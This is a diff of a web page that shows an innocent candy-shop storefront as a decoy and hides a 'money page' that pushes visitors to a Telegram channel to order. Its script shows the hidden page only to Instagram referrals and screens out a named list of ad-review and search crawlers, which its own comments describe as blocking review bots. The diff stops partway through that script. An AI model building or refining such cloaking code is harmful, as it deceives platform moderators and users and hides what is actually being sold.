@@ -5,20 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>zastation Sweet Treats | Gourmet Candy Shop</title>
     <style id="main-style">
-        body, html { margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
+        body, html { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #fff5f8; }
 
-        /* --- 白页：糖果店样式 --- */
-        #safe-page { display: block; background: #fff5f8; text-align: center; padding-bottom: 50px; }
-        .candy-header { background: #ff8fb1; padding: 40px 20px; color: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        /* --- 白页：糖果店样式 (Safe Page) --- */
+        #safe-page { display: block; text-align: center; padding-bottom: 50px; }
+        .candy-header { background: #ff8fb1; padding: 40px 20px; color: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
         .candy-logo { font-size: 24px; font-weight: bold; letter-spacing: 1px; }
         .candy-hero { padding: 40px 20px; }
-        .candy-card-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 10px; }
-        .candy-card { background: white; border-radius: 12px; width: 140px; padding: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .candy-img { width: 100%; height: 110px; border-radius: 8px; margin-bottom: 10px; object-fit: cover; }
-        .candy-name { font-size: 13px; font-weight: 600; color: #444; }
-        .candy-price { color: #ff8fb1; font-weight: bold; font-size: 14px; margin-top: 5px; }
+        .candy-card-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 10px; max-width: 1000px; margin: 0 auto; }
+        .candy-card { background: white; border-radius: 12px; width: calc(50% - 20px); max-width: 160px; padding: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); transition: 0.3s; }
+        .candy-img { width: 100%; height: 120px; border-radius: 8px; margin-bottom: 8px; object-fit: cover; background: #eee; }
+        .candy-name { font-size: 13px; font-weight: 600; color: #444; line-height: 1.4; }
 
-        /* --- 钱页：zastation 奢华黑金 --- */
+        /* --- 钱页：zastation 奢华黑金 (Money Page) --- */
         #money-page { 
             display: none; background: #000; color: #fff; position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; 
@@ -30,9 +29,8 @@
             display: block; background: linear-gradient(135deg, #d4af37 0%, #f9e295 100%); 
             color: #000; text-decoration: none; font-weight: 700; padding: 18px 0; width: 80%; 
             max-width: 300px; border-radius: 4px; font-size: 16px; letter-spacing: 2px;
-            text-transform: uppercase; box-shadow: 0 10px 30px rgba(212, 175, 55, 0.2); transition: 0.3s;
+            text-transform: uppercase; box-shadow: 0 10px 30px rgba(212, 175, 55, 0.2); 
         }
-        .btn:active { transform: scale(0.96); }
         .m-footer { position: absolute; bottom: 40px; font-size: 10px; color: #444; letter-spacing: 3px; }
     </style>
 </head>
@@ -40,29 +38,36 @@
 
     <div id="safe-page">
         <div class="candy-header"><div class="candy-logo">zastation Sweet Treats</div></div>
-        <div class="candy-hero"><h2 style="color: #ff8fb1;">Premium Handmade Sweets</h2><p style="color: #999;">Gourmet flavors for special moments.</p></div>
+        <div class="candy-hero"><h2 style="color: #ff8fb1;">Our Signature Collection</h2><p style="color: #999;">Explore our curated selection of gourmet sweets.</p></div>
+        
         <div class="candy-card-container">
-            <div class="candy-card">
-                <img src="https://images.unsplash.com/photo-1581798459219-318e76aecc7b?w=400&q=80" class="candy-img">
-                <div class="candy-name">Fruit Gummy</div>
-                <div class="candy-price">$5.00</div>
-            </div>
-            <div class="candy-card">
-                <img src="https://images.unsplash.com/photo-1534073828943-f801091bb18c?w=400&q=80" class="candy-img">
-                <div class="candy-name">Rock Candy</div>
-                <div class="candy-price">$3.00</div>
-            </div>
-            <div class="candy-card">
-                <img src="https://images.unsplash.com/photo-1499195333224-3ce974eecfb4?w=400&q=80" class="candy-img">
-                <div class="candy-name">Lollipops</div>
-                <div class="candy-price">$4.50</div>
-            </div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1581798459219-318e76aecc7b?w=300" class="candy-img"><div class="candy-name">Fruit Gummy Bears</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1534073828943-f801091bb18c?w=300" class="candy-img"><div class="candy-name">Sparkling Rock Candy</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1499195333224-3ce974eecfb4?w=300" class="candy-img"><div class="candy-name">Swirl Lollipops</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1575224300306-1b8da36134ec?w=300" class="candy-img"><div class="candy-name">Gourmet Macarons</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1525059696034-4967a8e1dca2?w=300" class="candy-img"><div class="candy-name">Assorted Jelly Beans</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1553452118-621e1f860f43?w=300" class="candy-img"><div class="candy-name">Sugar Coated Drops</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1532117892888-38c217a6d44a?w=300" class="candy-img"><div class="candy-name">Vanilla Marshmallows</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1621939514649-280e2eeec7f4?w=300" class="candy-img"><div class="candy-name">Vintage Hard Candy</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1544473244-f6895a69ad41?w=300" class="candy-img"><div class="candy-name">Pastel Dragées</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1600359756098-8bc52195bbf4?w=300" class="candy-img"><div class="candy-name">Belgian Pralines</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1599599810769-bcde5a160d32?w=300" class="candy-img"><div class="candy-name">Cocoa Truffles</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1504113888839-1c8ec03fce78?w=300" class="candy-img"><div class="candy-name">Peppermint Discs</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1471943311424-646960669fba?w=300" class="candy-img"><div class="candy-name">Citrus Slices</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1511381939415-e44015466834?w=300" class="candy-img"><div class="candy-name">Toffee Caramels</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1559181567-c3190cb9959b?w=300" class="candy-img"><div class="candy-name">Berry Fruit Chews</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1627916607164-7b20241db935?w=300" class="candy-img"><div class="candy-name">Sour Neon Worms</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1536681731411-36cd5489b018?w=300" class="candy-img"><div class="candy-name">Cotton Candy Fluff</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1614083576545-82e1fc0441d8?w=300" class="candy-img"><div class="candy-name">Honey Honeycomb</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1481391319762-47dff72954d9?w=300" class="candy-img"><div class="candy-name">Chocolate Glazed Bites</div></div>
+            <div class="candy-card"><img src="https://images.unsplash.com/photo-1528975604071-b4dc52a2d18c?w=300" class="candy-img"><div class="candy-name">Dark Fudge Tiles</div></div>
         </div>
-        <p style="font-size: 11px; color: #ddd; margin-top: 80px;">© 2026 zastation Confectionery. All rights reserved.</p>
+        
+        <p style="font-size: 11px; color: #ddd; margin-top: 80px;">© 2026 zastation Confectionery. No pricing available for display collection.</p>
     </div>
 
     <div id="money-page">
-        <img src="logo.png" alt="zastation" class="m-logo" onerror="this.src='https://via.placeholder.com/150/000000/FFFFFF?text=Logo+Missing'">
+        <img src="./logo.png" alt="zastation" class="m-logo" onerror="this.src='https://via.placeholder.com/150/000000/FFFFFF?text=Logo+Missing'">
         <div class="m-h1">To order, please join our Telegram Channel.</div>
         <a href="https://t.me/+M8BUaAlXvp4yZTkx" class="btn">JOIN CHANNEL</a>
         <div class="m-footer">SECURE ACCESS BY zastation</div>
@@ -72,9 +77,8 @@
         (function() {
             var ua = navigator.userAgent;
             var ref = document.referrer;
-            // 判断是否从 Instagram 开启
+            // 判定逻辑：仅来自 Instagram 且非机器人的访客可进入钱页
             var isInsta = (ref.indexOf('instagram.com') !== -1 || ua.indexOf('Instagram') !== -1);
-            // 屏蔽审查爬虫
             var bots = ['Facebot', 'facebookexternalhit', 'Googlebot', 'Twitterbot', 'AdsBot', 'Lighthouse'];
             var isBot = bots.some(function(bot) { return ua.indexOf(bot) !== -1; });
 
